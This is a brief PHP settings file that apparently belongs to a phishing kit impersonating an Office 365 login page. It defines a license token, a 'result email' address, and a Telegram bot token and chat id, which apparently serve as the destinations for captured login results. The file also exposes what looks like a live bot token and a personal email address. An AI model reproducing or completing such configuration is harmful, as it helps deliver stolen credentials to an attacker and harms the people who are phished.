<?php
$token ="70E2B-3A2F3-72922-0AF02-C40C1-AFB6D-28"; //license token
$domain=$_SERVER['SERVER_NAME']; //domain
$result_email="usamajony@gmail.com"; //result email
$app="office365";// page type
$botToken = "1877972688:AAH9LphCcQFGUlVqaEwuJ6NSRD4NNrh71z8";//telegram bot
$id = "1502905512";// telegarm bot id

?>